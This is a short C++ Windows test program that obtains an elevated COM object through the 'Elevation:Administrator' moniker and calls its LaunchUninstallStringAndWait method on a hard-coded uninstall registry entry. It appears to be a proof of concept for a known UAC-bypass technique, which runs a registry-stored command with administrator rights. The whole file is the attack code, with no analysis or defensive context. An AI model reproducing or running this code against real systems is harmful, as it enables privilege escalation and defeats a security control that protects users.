// TestInvokeARPUninstallStringLauncher.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <windows.h>
#include <strsafe.h>

#pragma comment(lib, "strsafe.lib")

typedef DWORD (__stdcall *PFN_IARPUninstallStringLauncher_LaunchUninstallStringAndWait)(LPVOID *, HKEY, LPCTSTR, BOOL, HWND);
typedef DWORD (__stdcall* PFN_IARPUninstallStringLauncher_Release)(LPVOID *);

HRESULT CoCreateInstanceAsAdmin(HWND hwnd, REFCLSID rclsid, REFIID riid, __out void ** ppv);
	
HRESULT CoCreateInstanceAsAdmin(HWND hwnd, REFCLSID rclsid, REFIID riid, __out void ** ppv)
{	
	BIND_OPTS3 bo;
	WCHAR  wszCLSID[50];
	WCHAR  wszMonikerName[300];
	
	StringFromGUID2(rclsid, wszCLSID, sizeof(wszCLSID)/sizeof(wszCLSID[0])); 
	HRESULT hr = StringCchPrintf(wszMonikerName, sizeof(wszMonikerName)/sizeof(wszMonikerName[0]), L"Elevation:Administrator!new:%s", wszCLSID);
	if (FAILED(hr))
		return hr;
	memset(&bo, 0, sizeof(bo));
	bo.cbStruct = sizeof(bo);
	bo.hwnd = hwnd;
	bo.dwClassContext  = CLSCTX_LOCAL_SERVER;
	return CoGetObject(wszMonikerName, &bo, riid, ppv);
}
								
int _tmain(int argc, _TCHAR* argv[])
{		
	CLSID  clsid;
	IID iid;
	LPVOID ppv = NULL;
	HRESULT hr;
	PFN_IARPUninstallStringLauncher_LaunchUninstallStringAndWait pfn_LaunchUninstallStringAndWait = NULL;
	PFN_IARPUninstallStringLauncher_Release pfn_IARPUninstallStringLauncher_Release = NULL;
	
	if (IIDFromString(L"{FCC74B77-EC3E-4DD8-A80B-008A702075A9}", &clsid) ||
		IIDFromString(L"{F885120E-3789-4FD9-865E-DC9B4A6412D2}", &iid))
	return 0;
	
	CoInitialize(NULL);
		
	hr = CoCreateInstanceAsAdmin(NULL, clsid, iid, &ppv);
	
	if (SUCCEEDED(hr))
	{
			pfn_LaunchUninstallStringAndWait  = (PFN_IARPUninstallStringLauncher_LaunchUninstallStringAndWait)(*(DWORD*)(*(DWORD*)ppv + 12));
			pfn_IARPUninstallStringLauncher_Release = (PFN_IARPUninstallStringLauncher_Release)(*(DWORD*)(*(DWORD*)ppv + 8));
			
			if (pfn_LaunchUninstallStringAndWait && pfn_IARPUninstallStringLauncher_Release)
			{
				pfn_LaunchUninstallStringAndWait((LPVOID*)ppv, 0, L"{18E78D31-BBCC-4e6f-A21D-0A15BBC62D49}", 0, NULL);
				pfn_IARPUninstallStringLauncher_Release((LPVOID*)ppv);
			}
	}
	
	CoUninitialize();
	
	return 0;
}

